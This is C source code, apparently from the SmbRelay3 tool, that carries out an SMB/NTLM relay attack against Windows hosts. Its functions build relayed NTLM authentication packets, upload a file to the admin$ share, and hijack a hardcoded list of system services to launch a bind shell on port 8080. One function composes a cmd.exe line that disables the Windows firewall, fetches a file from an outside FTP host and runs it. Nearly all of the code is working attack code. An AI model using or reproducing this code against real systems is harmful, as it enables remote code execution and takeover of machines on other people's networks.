#include "payload.h"
#include <time.h>

//extern char *filter;
extern int verbose;
int AttackWeakServices(RELAY relay, char *buf,char *path, uint16 FID, char *ServicePath){
    //RAW SMBRELAY FUNCTION
    smheader *packet;
    uint8 ContextHandle[20];
    uint8 OpenedServiceContextHandle[20];
    char ServiceName[][100] = {"DcomLaunch","Wmi","kdc","upnpHost","SSDPSRV","DHCP","NetBT","DnsCache","Pml Driver HPZ12","Adobe LM Service","Autodesk Licensing Service", "NICCONFIGSVC","Macromedia Licensing Service","vsdatant","C-DillaCdaC11BA","CdaC15BA","SecDrv" };
    int len;
    char data[4046];
    int i,j;

    //Trying to connect with lowest permissions...
    len=OpenScManagerWStub(data,path,SC_MANAGER_CONNECT) ;
    packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,OPENSCMANAGER,(char*)data,len);
    ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
    printf("[+] Opening Remote Service Control Manager (SC_MANAGER_CONNECT)\n");   
    i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
    free(packet);    
    if (( i<=0) || (((smheader*)buf)->NtStatus!=0x00000000)  || (GetDceRpcPacketFromBuffer(buf)->PacketType != RPC_RESPONSE) ){
       return(0);
    }
    memcpy((char*)ContextHandle,buf+i-24,20);

    for (j=0;j<sizeof(ServiceName)/100;j++)
    {
        //OPENING SERVICE WITH MODIFICATION FLAGS..
        len=OpenServiceWStub(data,(char*)ContextHandle,ServiceName[j],  SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_STOP);
        packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,OPENSERVICEW,data,len);
        ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
        printf("[+] Attacking Remote Service %s\n",ServiceName[j]);
        i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
        free(packet);
        if (( i<=0) || (((smheader*)buf)->NtStatus!=0x00000000)  || (GetDceRpcPacketFromBuffer(buf)->PacketType != RPC_RESPONSE) ){
            printf("[-] Error. Unable to Open Remote service                            \n");
        } else {
            memcpy((char*)OpenedServiceContextHandle,buf+i-24,20);
            len=ChangeServiceConfigWStub(data,(char*)OpenedServiceContextHandle,ServicePath, SERVICE_AUTO_START,SERVICE_WIN32_SHARE_PROCESS);
            packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,CHANGESERVICECONFIG,data,len);
            ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
            printf("[+] Cambiando configuración de servicio...\r");
            i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
            free(packet);
            if (( i<=0) || (((smheader*)buf)->NtStatus!=0x00000000)  || (GetDceRpcPacketFromBuffer(buf)->PacketType != RPC_RESPONSE) ){
                printf("[-] Error. Unable to Modify Service...\n");
            } else {
                packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,STARTSERVICE,OpenedServiceContextHandle, 20);
                ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
                send(relay.destination, (char*)packet,  SmbPacketLen(packet),0) ;
                free(packet);
                Sleep(1000);
                printf("[+] *** Remote SmbRelay3 BindShell Service Running ***: (%s:%i)\n\n",relay.hostname,8080);    
                Sleep(3000);
                return(1);
            }

        }
    }
    return(0);
}

int WriteRemoteFile(RELAY relay, smheader *buffer, char *lpFileName)
{
	char path[256];
	char buf[64000];
	smheader *packet;
	int i;
	int filesize;
	char *filedata;
	uint16 FID;
	uint16 TreeID;

	sprintf(path,"\\\\%s\\admin$",inet_ntoa(relay.destinationaddr.sin_addr));
	memset(buf,0,sizeof(buf));
    i=BuildTreeConnectAndXStub(buf,"",path,"?????");
	packet=BuildSmbPacket((smheader*)buffer,TREECONNETANDX,0,buf,i);//,(int)strlen(path));
	printf("[+] Trying to connect to admin$\r");
    
	if (debug)
	{
        CleanLine(verbose);
        DumpMem((char*)packet,SmbPacketLen(packet));
	}
    i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
        CleanLine(verbose);
		printf("[-] Error. Unable to connect to admin$\n");
        return(0);
	}
	TreeID=((smheader*)buf)->TreeId;


	sprintf(path,"\\%s",lpFileName);
	filedata =ReadFileToSend(&filesize,lpFileName);
	if(!filedata)
	{
		CleanLine(verbose);
        printf("[-] Error. Unable to open %s\n",lpFileName);
		return(0);
	}
	packet=BuildSmbPacket((smheader*)buf,NTCREATEANDX,0,path,filesize);
    CleanLine(verbose);
	printf("[+] Creating Remote File %s under admin$\r",lpFileName);
	if (debug)
	{		
        CleanLine(verbose);
		DumpMem((char*)packet,SmbPacketLen(packet));
	}
    i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
        CleanLine(verbose);
        if ( ((smheader*)buf)->NtStatus == STATUS_SHARING_VIOLATION) {
            printf("[-] Remote File already in use (try to connect to the remote Shell).\n");
            return(1);
        }
		printf("[-] Error. Unable to create file under admin$ (Error 0x%x)\n",((smheader*)buf)->NtStatus);
        return(0);
	}
    memcpy((char*)&FID,((smheader*)buf)->buffer+6,2);
    CleanLine(verbose);
	printf("[+] Writing File %s into admin$ (%i bytes)\r",lpFileName,filesize);
	packet=BuildSmbPacket((smheader*)buf,WRITEANDX,0,filedata,filesize);
	free(filedata);
	
	if (debug)
	{		
        CleanLine(verbose);
        DumpMem((char*)packet,SmbPacketLen(packet));
	}
    i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){	        
        CleanLine(verbose);
        printf("[-] Error. Unable to Write File.\n");
        return(0);
	}

	packet=BuildSmbPacket((smheader*)buf,SMBCLOSE,0,&FID,2);	
	
	packet->TreeId=TreeID;
	if (verbose)
	{	
        CleanLine(verbose);
        printf("[*] Closing File handle - FID: %2.2x\r",FID);
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
    i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
        CleanLine(verbose);
		printf("[-] Error Closing File Handle\n");
        return(0);
	}
	return(1);

}




/*********************************************/
smheader *BuildSmbPacket1(void)
{
	char buf2[4096];
	smheader *SmbPacket1;
	memset((char*)buf2,'\0',sizeof(buf2));
	BuildAuthRequest((tSmbNtlmAuthRequest*)buf2,0,NULL,NULL);
#ifdef _DBG_
	DumpMem((char*)buf2,SmbLength((tSmbNtlmAuthRequest*)buf2));
#endif
	SmbPacket1=BuildSmbPacket((smheader*)NULL,SESSIONSETUPANDX,0,buf2,40);

	return(SmbPacket1);
}
/*********************************************/
smheader *GetSmbPacket2(RELAY *relay,smheader* Packet1)
{
	char *buffer=(char*)malloc(4096);
	int i;
    i=SendBytesAndWaitForResponse(relay->destination,(char*)Packet1, SmbPacketLen(Packet1), buffer,4096,SMBWAITTIMEOUT);
	if (i>0){
		return((smheader*)buffer);
	}
	return(NULL);
}
/*********************************************/
smheader *GetSmbPacket3(smheader* SmbPacket2,char *lpUserName, char *lpPassword,  char *domainname, char *host, tSmbNtlmAuthResponse* OptionalNtlmPacket3)
{
	char buf2[16384];
	smheader *SmbPacket3;
	memset((char*)buf2,'\0',sizeof(buf2));
	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2),(tSmbNtlmAuthResponse*)buf2,0,lpUserName,lpPassword,domainname,host, OptionalNtlmPacket3);
    //DumpMem((void*)buf2,sizeof(tSmbNtlmAuthResponse));
	SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));
	return(SmbPacket3);
}
/*********************************************/


char *GenerateFTPTransfer(char *buffer,char *host, int port, char *username, char *password, char *downloadfile,char *optionalparameter)
{
    char tmp[256];
    char path[256];
    char fullpath[100];
    int random=0;

    srand(time(0));
    random=rand();
    sprintf(path,"\\%i",random);
    srand(random);
    random=rand();
    sprintf(fullpath,"%s\\%i",path,random);

    //sprintf(tmp,"cmd.exe /c if EXIST %s\\%s (%s\\%s) ELSE netsh firewall add portopening TCP 8080 Smbrelay ENABLE ALL && ",path,downloadfile,path,downloadfile);
    sprintf(tmp,"cmd.exe /c if EXIST %s\\%s (%s\\%s) ELSE netsh firewall set opmode DISABLE DISABLE & ",path,downloadfile,path,downloadfile);
    strcpy(buffer,tmp);

    sprintf(tmp,"md %s",path);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo o %s %i>%s",host, port,fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo %s>>%s",username,fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo %s>>%s",password,fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo USER %s>>%s",username,fullpath); //try password twice
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo %s>>%s",password,fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo bin>>%s",fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo lcd %s>>%s",path,fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo bin>>%s",fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo GET %s>>%s",downloadfile,fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& echo bye>>%s",fullpath);
    strcat(buffer,tmp);
    sprintf(tmp,"&& ftp -s:%s",fullpath);
    strcat(buffer,tmp);
    if (optionalparameter) {
	    sprintf(tmp,"&& %s\\%s %s",path,downloadfile,optionalparameter);
    } else {
	    sprintf(tmp,"&& %s\\%s",path,downloadfile);
    }
    strcat(buffer,tmp);

    return(buffer);
}



